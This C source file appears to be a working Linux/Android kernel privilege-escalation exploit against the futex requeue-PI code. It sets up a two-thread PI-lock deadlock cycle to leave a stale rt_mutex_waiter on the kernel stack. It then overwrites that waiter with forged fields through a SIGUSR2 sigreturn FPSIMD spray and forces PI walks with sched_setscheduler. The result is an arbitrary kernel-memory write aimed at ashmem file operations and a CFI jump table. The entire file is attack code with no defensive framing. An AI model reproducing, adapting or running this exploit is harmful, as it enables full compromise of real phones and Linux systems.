#define _GNU_SOURCE
#include "target.h"
#include "common.h"

#include <ctype.h>
#include <errno.h>
#include <linux/futex.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <signal.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sched.h>
#include <time.h>
#include <sys/ioctl.h>
#include <linux/ashmem.h>
#include <ucontext.h>
#include <stdatomic.h>
#include <sys/types.h>

#ifndef FPSIMD_MAGIC
#define FPSIMD_MAGIC 0x46508001ULL
#endif

struct k_fpsimd_context {
    uint32_t magic;
    uint32_t size;
    uint32_t fpsr;
    uint32_t fpcr;
    uint8_t  vregs[32 * 16];
};

#ifndef SIGRETURN_FPSIMD_WAITER_OFF
#define SIGRETURN_FPSIMD_WAITER_OFF 0x148
#endif

static atomic_int sigret_respray_flag = 0;
static atomic_int sigret_handler_done = 0;
static atomic_int sigret_handler_status = 0;
static _Atomic uint64_t sigret_respray_pc = 0;
static _Atomic uint64_t sigret_respray_val = 0;
static _Atomic uint64_t sigret_respray_lock = 0;
static void *g_waiter_task_at_trigger = NULL;

#define LOG(fmt, ...) \
    do { \
        printf("[race] " fmt "\n", ##__VA_ARGS__); \
        fflush(stdout); \
    } while (0)

static long get_sigreturn_offset(void) {
    const char *env = getenv("SIGRETURN_WAITER_OFF");
    if (env) return strtol(env, NULL, 0);
    return SIGRETURN_FPSIMD_WAITER_OFF;
}

static void sigreturn_handler(int sig, siginfo_t *info, void *ucontext) {
    (void)sig; (void)info;
    ucontext_t *uc = (ucontext_t *)ucontext;
    unsigned char *start = uc->uc_mcontext.__reserved;
    unsigned char *end = start + sizeof(uc->uc_mcontext.__reserved);
    unsigned char *cur = start;
    int status = -3;

    while ((size_t)(end - cur) >= 8) {
        uint32_t m = *(const uint32_t *)cur;
        uint32_t sz = *(const uint32_t *)(cur + 4);
        if (m == 0 && sz == 0) break;
        if (sz < 8 || (sz & 15) || (size_t)(end - cur) < (size_t)sz) break;
        if (m == (uint32_t)FPSIMD_MAGIC) {
            struct k_fpsimd_context *fpsimd = (struct k_fpsimd_context *)cur;
            long off = get_sigreturn_offset();
            if ((size_t)off + RT_MUTEX_WAITER_SIZE > sizeof(*fpsimd)) {
                status = -5;
                break;
            }
            unsigned char *dst = (unsigned char *)fpsimd + off;
            uint64_t *w = (uint64_t *)dst;

            LOG("SIG-ENTRY fpsimd=%p off=%#lx", fpsimd, off);

            if (atomic_load(&sigret_respray_flag)) {
                w[0x00/8] = atomic_load(&sigret_respray_pc);
                w[0x08/8] = atomic_load(&sigret_respray_val);
                w[0x10/8] = 0;
                w[0x18/8] = 0;
                w[0x20/8] = 0;
                w[0x28/8] = 0;
                w[0x30/8] = (uint64_t)ADDR_INIT_TASK;              // valid task_struct → PI-walk terminates
                w[0x38/8] = (uint64_t)(ADDR_ASHMEM_FOPS + 0x28 - 8); // write_target - 8
                for (size_t i = 0x40/8; i < RT_MUTEX_WAITER_SIZE/8; i++) w[i] = 0;
                atomic_store(&sigret_respray_flag, 0);
            } else {
                memset(w, 0, RT_MUTEX_WAITER_SIZE);
                w[0x00/8] = (uint64_t)(ADDR_ASHMEM_FOPS + 0x20);
                w[0x08/8] = 0;
                w[0x10/8] = (uint64_t)ADDR_CONFIGFS_WRITE_BIN_FILE_CFI_JT;
                w[0x30/8] = (uint64_t)ADDR_INIT_TASK;                     // valid task_struct → terminates PI-walk
                w[0x38/8] = (uint64_t)(ADDR_ASHMEM_FOPS + 0x28 - 8);      // write_target - 8 → rb_parent_color lands at target
            }

            LOG("GHOST-TASK ptr=%p", (void*)ADDR_GHOST_TASK);

            LOG("SIG-WRITTEN %016lx %016lx %016lx %016lx %016lx %016lx "
                "%016lx %016lx %016lx %016lx",
                w[0],w[1],w[2],w[3],w[4],w[5],w[6],w[7],w[8],w[9]);

            status = 1;
            break;
        }
        cur += sz;
    }
    atomic_store(&sigret_handler_status, status);
    atomic_store(&sigret_handler_done, 1);
}

static void sigreturn_install_handler(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = sigreturn_handler;
    sa.sa_flags = SA_SIGINFO | SA_RESTART;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGUSR2, &sa, NULL);
}

/* ── EXP32_STAMP_OFF runtime override for calibration ── */
static size_t get_stamp_offset(void)
{
    const char *env = getenv("EXP32_STAMP_OFF");
    if (env) {
        char *end = NULL;
        unsigned long val = strtoul(env, &end, 0);
        if (end != env && val < 256 && toupper(*end) == 'X') {
            return (size_t)val;
        } else if (end != env && val < 256) {
            return (size_t)val;
        }
    }
    return 0x58;
}

#ifndef FUTEX_PRIVATE_FLAG
#define FUTEX_PRIVATE_FLAG 128
#endif
#define FUTEX_WAIT_REQUEUE_PI_PRIVATE (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define FUTEX_CMP_REQUEUE_PI_PRIVATE  (FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define FUTEX_LOCK_PI_PRIVATE         (FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG)
#define FUTEX_UNLOCK_PI_PRIVATE       (FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG)

/* ── PI-cycle deadlock topology: Thread X and Thread Y ── */
static _Atomic int pi1  = 0;
static _Atomic int pi2  = 0;
static _Atomic int cond = 0;

static atomic_int x_locked_l1 = 0;
static atomic_int y_locked_l2 = 0;
static atomic_int x_blocking  = 0;
static atomic_int y_parking   = 0;
static atomic_int y_done      = 0;
static atomic_int y_tid       = 0;
static atomic_int x_done      = 0;
static atomic_int y_cleanup   = 0;

/* FUTEX_WAKE helper (private) */
static inline long futex_wake_one(volatile int *addr) {
    return syscall(SYS_futex, addr, FUTEX_WAKE | FUTEX_PRIVATE_FLAG, 1, NULL, NULL, 0);
}

static uint64_t now_ms(void)
{
    struct timespec ts;
    if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) {
        return 0;
    }
    return (uint64_t)ts.tv_sec * 1000ULL + (uint64_t)ts.tv_nsec / 1000000ULL;
}

/* Thread Y: owns pi2, parks on cond->pi1, then stamps ghost */
void *thread_Y(void *arg __attribute__((unused))) {
    atomic_store(&y_tid, (int)syscall(SYS_gettid));

    /* 1. Install SIGUSR2 sigreturn handler BEFORE we park.
     *    Must be active at the moment we return from FUTEX_WAIT_REQUEUE_PI so
     *    we can immediately self-signal for the stamp without any intervening
     *    syscall that would push a new kernel frame and clobber the stale waiter. */
    sigreturn_install_handler();

    /* 2. Acquire PI lock 2 (L2) */
    long r = futex_raw(&pi2, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);
    if (r != 0) { LOG("thread_Y: LOCK_PI(pi2) failed errno=%d", errno); return NULL; }
    atomic_store(&y_locked_l2, 1);

    /* 3. Wait for thread_X to own pi1 and block on pi2 */
    while (!atomic_load(&x_locked_l1)) sched_yield();

    /* 4. Park on cond -> pi1 with NO TIMEOUT.
     *
     *    Main thread calls CMP_REQUEUE_PI(cond, 1, pi1):
     *      - Kernel detects Y->pi1->pi2->Y deadlock cycle -> EDEADLK
     *      - DURING that walk, requeue_waiter() moves Y's rt_mutex_waiter from
     *        cond's hash-bucket into pi1's waiter rb-tree
     *      - When CMP_REQUEUE_PI returns EDEADLK to main, Y's waiter is IN pi1
     *
     *    Main then sets cond=1 + calls FUTEX_WAKE on cond.
     *    We wake via the normal futex wakeup path (NOT SIGUSR1/EINTR).
     *    EINTR would call remove_waiter() -> stale pointer gone -> exploit fails.
     *    FUTEX_WAKE preserves the stale pi1 waiter pointer intact. */
    atomic_store(&y_parking, 1);
    r = futex_raw(&cond, FUTEX_WAIT_REQUEUE_PI_PRIVATE, 0, 0, &pi1, 0);
    LOG("thread_Y: FUTEX_WAIT_REQUEUE_PI returned r=%ld errno=%d", r, errno);

    /* 5. Initial stamp via SIGUSR2 -> sigreturn handler.
     *    Handler writes ghost fields into FPSIMD vregs in the userspace ucontext.
     *    rt_sigreturn copies 528B onto kernel stack -> overwrites stale waiter.
     *    Stack geometry (verified): buffer_start = SP_sys-0x330, waiter at +0x148. */
    atomic_store(&sigret_respray_flag, 0);
    atomic_store(&sigret_handler_done, 0);
    atomic_store(&sigret_handler_status, 0);
    {
        int tid = (int)syscall(SYS_gettid);
        syscall(SYS_tgkill, getpid(), tid, SIGUSR2);
        while (!atomic_load(&sigret_handler_done)) sched_yield();
        LOG("thread_Y: initial SIGRETURN stamp status=%d",
            atomic_load(&sigret_handler_status));
    }

    atomic_store(&y_done, 1);

    /* 6. Respray loop: stays resident on this stack so the stale PI-chain pointer
     *    (which points here) remains valid while ghost_write_value operates. */
    int respray_count = 0;
    for (;;) {
        if (g_respray_ready) {
            g_respray_ready = 0;
            atomic_store(&sigret_respray_pc,   (uint64_t)g_respray_parent_color);
            atomic_store(&sigret_respray_val,  (uint64_t)g_respray_value);
            atomic_store(&sigret_respray_flag, 1);
            atomic_store(&sigret_handler_done, 0);
            {
                int tid = (int)syscall(SYS_gettid);
                syscall(SYS_tgkill, getpid(), tid, SIGUSR2);
                while (!atomic_load(&sigret_handler_done)) sched_yield();
            }
            respray_count++;
            LOG("RESPRAY-DONE: sigreturn status=%d pc=0x%lx val=0x%lx",
                atomic_load(&sigret_handler_status),
                g_respray_parent_color, g_respray_value);
            LOG("thread_Y: respray #%d status=%d pc=0x%lx val=0x%lx",
                respray_count, atomic_load(&sigret_handler_status),
                g_respray_parent_color, g_respray_value);
            __atomic_store_n(&g_respray_done, 1, __ATOMIC_RELEASE);
        }
        if (atomic_load(&y_cleanup)) break;
        sched_yield();
    }

    /* 7. DISARM: zero-timeout LOCK_PI on a self-owned futex forces the kernel PI
     *    slowpath -> remove_waiter() sets task->pi_blocked_on = NULL, cleanly
     *    unlinking the ghost from every PI walk. Without this, the stale pointer
     *    stays live and causes deadlock/panic on process exit (confirmed on POCO). */
    int dummy_pi = (int)(0x80000000U | (unsigned int)getpid());
    struct timespec ts_zero = { .tv_sec = 0, .tv_nsec = 0 };
    (void)futex_raw(&dummy_pi, FUTEX_LOCK_PI_PRIVATE, 0, (long)&ts_zero, NULL, 0);
    LOG("thread_Y: disarmed pi_blocked_on");

    /* 8. Release L2 so thread_X can wake and exit cleanly */
    futex_raw(&pi2, FUTEX_UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);

    /* 9. Wait for X to finish (stack must remain valid until X exits) */
    while (!atomic_load(&x_done)) sched_yield();

    LOG("thread_Y: exiting after %d resprays", respray_count);
    return NULL;
}

/* Thread X: owns pi1, blocks on pi2 (held by Y) — creates the deadlock cycle */
void *thread_X(void *arg __attribute__((unused))) {
    while (!atomic_load(&y_locked_l2)) sched_yield();

    /* Acquire pi1 (L1) */
    long r = futex_raw(&pi1, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);
    if (r != 0) { LOG("thread_X: LOCK_PI(pi1) failed errno=%d", errno); return NULL; }
    atomic_store(&x_locked_l1, 1);

    /* Block on pi2 (L2, held by Y) — creates Y->pi1->pi2->Y deadlock cycle */
    atomic_store(&x_blocking, 1);
    r = futex_raw(&pi2, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);
    LOG("thread_X: LOCK_PI(pi2) woke r=%ld errno=%d", r, errno);

    /* Woke up (Y released L2 via disarm). Release both locks. */
    futex_raw(&pi1, FUTEX_UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
    futex_raw(&pi2, FUTEX_UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
    atomic_store(&x_done, 1);
    LOG("thread_X: released L1/L2, exiting");
    return NULL;
}

int trigger_futex_race(void)
{
    LOG("=== trigger_futex_race (PI-cycle deadlock) BEGIN ===");

    g_k_fake_lock  = ADDR_FAKE_LOCK;
    g_k_fake_lock2 = ADDR_FAKE_LOCK + 0x80;
    g_k_ghost_task = ADDR_GHOST_TASK;
    LOG("ghost_init: fake_lock=0x%lx fake_lock2=0x%lx ghost_task=0x%lx",
        g_k_fake_lock, g_k_fake_lock2, g_k_ghost_task);

    /* Reset all topology state */
    pthread_t ty, tx;
    atomic_store(&y_tid,      0);
    atomic_store(&x_locked_l1, 0);
    atomic_store(&y_locked_l2, 0);
    atomic_store(&x_blocking,  0);
    atomic_store(&y_parking,   0);
    atomic_store(&y_done,      0);
    atomic_store(&x_done,      0);
    atomic_store(&y_cleanup,   0);
    atomic_store(&cond, 0);
    atomic_store(&pi1,  0);
    atomic_store(&pi2,  0);

    /* Start threads: Y first (acquires pi2), then X (acquires pi1, blocks on pi2) */
    int rty = pthread_create(&ty, NULL, thread_Y, NULL);
    LOG("pthread_create(Y) ret=%d", rty);
    if (rty != 0) { LOG("pthread_create(Y) failed"); return -1; }

    int rtx = pthread_create(&tx, NULL, thread_X, NULL);
    LOG("pthread_create(X) ret=%d", rtx);
    if (rtx != 0) { LOG("pthread_create(X) failed"); return -1; }

    /* Wait for full deadlock topology: Y owns L2, X owns L1, X blocks on L2, Y parks on cond */
    for (int i = 0; i < 200000; i++) {
        if (atomic_load(&y_locked_l2) && atomic_load(&x_locked_l1) &&
            atomic_load(&y_parking)   && atomic_load(&x_blocking)) break;
        usleep(10);
    }
    LOG("PHASE1: deadlock topology ready Y_locked=%d X_locked=%d Y_parking=%d X_blocking=%d",
        atomic_load(&y_locked_l2), atomic_load(&x_locked_l1),
        atomic_load(&y_parking), atomic_load(&x_blocking));

    /* Allow scheduler to fully settle */
    usleep(200000);

    /* Trigger CMP_REQUEUE_PI(cond, 1, pi1):
     *   Kernel walks: cond waiter Y -> try lock pi1 (owned by X) -> try lock pi2
     *   (owned by Y) -> CYCLE DETECTED -> -EDEADLK.
     *   BUT: before returning EDEADLK, kernel called requeue_waiter() moving Y's
     *   rt_mutex_waiter from cond's hash-bucket into pi1's waiter rb-tree.
     *   Y's waiter is now a STALE POINTER — pi1 waiter tree references kernel stack. */
    LOG("=== TRIGGERING CMP_REQUEUE_PI ===");
    errno = 0;
    long r = futex_raw(&cond, FUTEX_CMP_REQUEUE_PI_PRIVATE, 1, 0, &pi1, 0);
    LOG("CMP_REQUEUE_PI returned r=%ld errno=%d", r, errno);

    /* futex_raw() returns -errno directly (not via errno variable).
     * -EDEADLK (-35) is expected: kernel detected the PI cycle and called
     * requeue_waiter() to move Y's waiter from cond into pi1's waiter tree.
     * The stale pointer is now live on Y's kernel stack. */
    if (-r == EDEADLK) {
        LOG("CMP_REQUEUE_PI: -EDEADLK confirmed (expected) — stale waiter in pi1 tree");
    } else {
        LOG("CMP_REQUEUE_PI: unexpected result r=%ld (want -EDEADLK=-35)", r);
    }

    /* Wake Y via tgkill(SIGUSR1):
     * After requeue_waiter(), Y's waiter is in pi1's tree, NOT on cond.
     * FUTEX_WAKE on cond would not reach it. Must use SIGUSR1.
     * cond=1 is set FIRST so Y doesn't re-park after waking.
     * The sigreturn handler is already installed (done before park in thread_Y),
     * so SIGUSR2 for the stamp fires correctly on -EINTR return. */
    atomic_store(&cond, 1);
    __atomic_thread_fence(__ATOMIC_SEQ_CST);
    int y_t = atomic_load(&y_tid);
    errno = 0;
    long sigr = syscall(SYS_tgkill, getpid(), y_t, SIGUSR1);
    LOG("tgkill(SIGUSR1 y_tid=%d) ret=%ld errno=%d", y_t, sigr, errno);

    /* Wait for Y to complete the initial stamp */
    for (int i = 0; i < 200000 && !atomic_load(&y_done); i++) usleep(10);

    LOG("PHASE1: Y done=%d", atomic_load(&y_done));
    if (!atomic_load(&y_done)) {
        LOG("PHASE1: FAIL — Y did not complete stamp");
        return 1;
    }

    /* Trigger PI walk: sched_setscheduler on Y walks Y->pi_blocked_on into our stamp */
    y_t = atomic_load(&y_tid);
    struct sched_param sp = { .sched_priority = 0 };
    errno = 0;
    long sch = syscall(SYS_sched_setscheduler, y_t, SCHED_NORMAL, &sp);
    LOG("sched_setscheduler(y_tid=%d) ret=%ld errno=%d", y_t, sch, errno);

    LOG("=== trigger_futex_race END ===");
    (void)ty; (void)tx;
    return 2;
}

/* stubs for compatibility */
int trigger_walk(void) {
    return 0;
}

/* ── Global ghost write state (shared with thread_Y for respray) ── */
uint64_t g_k_fake_lock = 0;
uint64_t g_k_fake_lock2 = 0;
uint64_t g_k_ghost_task = 0;

volatile int g_respray_ready = 0;
volatile int g_respray_done = 0;
uint64_t g_respray_parent_color = 0;
uint64_t g_respray_value = 0;
uint64_t g_respray_lock = 0;

extern struct race_ctx *g_race_ctx_for_ghost;
struct race_ctx *g_race_ctx_for_ghost = NULL;

/* ── sched_setscheduler to trigger PI-walk with respray ── */
static long trigger_adj_pi(pid_t tid)
{
    struct sched_param sp = { .sched_priority = 0 };
    /* Toggle between SCHED_NORMAL and SCHED_BATCH to force PI-walk */
    static unsigned long y_pol = 0;
    long pol = (y_pol == 0) ? (long)SCHED_BATCH : (long)SCHED_NORMAL;
    LOG("TRIG-PRE tid=%d", tid);
    long r = syscall(SYS_sched_setscheduler, tid, pol, &sp);
    LOG("TRIG-POST ret=%ld errno=%d", r, errno);
    y_pol = (unsigned long)pol;
    return r;
}

int ghost_write_value(uint64_t target, uint64_t value)
{
    /* Set up the respray geometry:
     * - parent_color = (target - 8) & ~3  : encodes target address in rb_parent_color
     * - value = value                     : what gets written to target
     * - lock = k_fake_lock2               : new lock for second PI-walk
     */
    g_respray_parent_color = (target - 8) & ~3UL;
    LOG("[RESRAY] ghost_write_global called: target=0x%lx value=0x%lx", target, value);
    g_respray_value = value;
    g_respray_lock = g_k_fake_lock2;

    __atomic_store_n(&g_respray_done, 0, __ATOMIC_RELEASE);
    LOG("RESPRAY-REQ: parent_color=0x%llx value=0x%llx lock=0x%llx",
        (unsigned long long)g_respray_parent_color,
        (unsigned long long)g_respray_value,
        (unsigned long long)g_respray_lock);
    g_respray_ready = 1;
    LOG("[RESRAY] g_respray_ready set for target 0x%lx", target);
    __atomic_thread_fence(__ATOMIC_SEQ_CST);

    /* Wait for thread_Y to pick up the respray */
    while (!g_respray_done) {
        sched_yield();
    }

    /* Trigger PI-walk with new lock to apply the respray */
    pid_t y_tid_val = atomic_load(&y_tid);
    long tr = trigger_adj_pi(y_tid_val);
    LOG("ghost_write_value: trigger_adj_pi=%ld (0x%lx -> 0x%lx)", tr, value, target);

    /* Increment fake_lock2 to avoid caching issues */
    if (g_k_fake_lock2 != 0) {
        g_k_fake_lock2 += 8;
        if (g_k_fake_lock2 >= g_k_fake_lock + 0x100) {
            g_k_fake_lock2 = g_k_fake_lock + 8;
        }
    }

    return 0;
}

int ghost_write_global(uint64_t target, uint64_t value) {
    return ghost_write_value(target, value);
}
